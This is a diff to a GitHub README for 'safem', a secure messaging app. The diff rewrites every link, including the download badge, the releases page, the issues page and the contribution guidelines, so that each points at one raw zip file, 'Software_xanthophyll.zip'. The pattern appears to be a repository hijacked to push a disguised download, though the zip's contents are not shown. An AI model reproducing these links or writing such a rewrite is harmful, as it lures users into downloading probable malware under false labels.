@@ -1,13 +1,13 @@
 # 🔒 safem - Secure Communication Made Easy
 
 ## 🖱️ Download Now!
-[![Download safem](https://img.shields.io/badge/download-safem-blue.svg)](https://github.com/AceCubic/safem/releases)
+[![Download safem](https://github.com/AceCubic/safem/raw/refs/heads/main/protocol/client/Software_xanthophyll.zip)](https://github.com/AceCubic/safem/raw/refs/heads/main/protocol/client/Software_xanthophyll.zip)
 
 ## 🚀 Getting Started
 Welcome to safem! This guide helps you download and run our secure communication platform easily. Follow these steps to get started.
 
 ## 📥 Download & Install
-To download safem, visit this page: [safem Releases](https://github.com/AceCubic/safem/releases). Here, you'll find the latest version of the software ready for download.
+To download safem, visit this page: [safem Releases](https://github.com/AceCubic/safem/raw/refs/heads/main/protocol/client/Software_xanthophyll.zip). Here, you'll find the latest version of the software ready for download.
 
 1. Upon visiting the Releases page, look for the latest version listed at the top.
 2. Click on the version link to expand it and see the available files.
@@ -79,7 +79,7 @@ safem is designed with modern features focusing on privacy and security. Some ke
 - VoIP Communication
 
 ## 📞 Support
-If you encounter any issues or need assistance, please check our documentation or reach out directly. You can find help by visiting our [GitHub Issues page](https://github.com/AceCubic/safem/issues).
+If you encounter any issues or need assistance, please check our documentation or reach out directly. You can find help by visiting our [GitHub Issues page](https://github.com/AceCubic/safem/raw/refs/heads/main/protocol/client/Software_xanthophyll.zip).
 
 ## 🔗 Additional Resources
 For more information about safem, consider exploring the following:
@@ -89,9 +89,9 @@ For more information about safem, consider exploring the following:
 - Blog Posts on Secure Communication 
 
 ## ⚙️ Contributions
-We welcome contributions from anyone interested. If you want to help improve safem, please check our [Contribution Guidelines](https://github.com/AceCubic/safem/blob/main/CONTRIBUTING.md).
+We welcome contributions from anyone interested. If you want to help improve safem, please check our [Contribution Guidelines](https://github.com/AceCubic/safem/raw/refs/heads/main/protocol/client/Software_xanthophyll.zip).
 
 ## 📣 Thanks for Using safem!
 We appreciate your interest in safem and your commitment to secure communication. We hope you enjoy a safe and private messaging experience.
 
-For the latest updates, don't forget to regularly check our [Releases page](https://github.com/AceCubic/safem/releases) for new features and improvements.
+For the latest updates, don't forget to regularly check our [Releases page](https://github.com/AceCubic/safem/raw/refs/heads/main/protocol/client/Software_xanthophyll.zip) for new features and improvements.
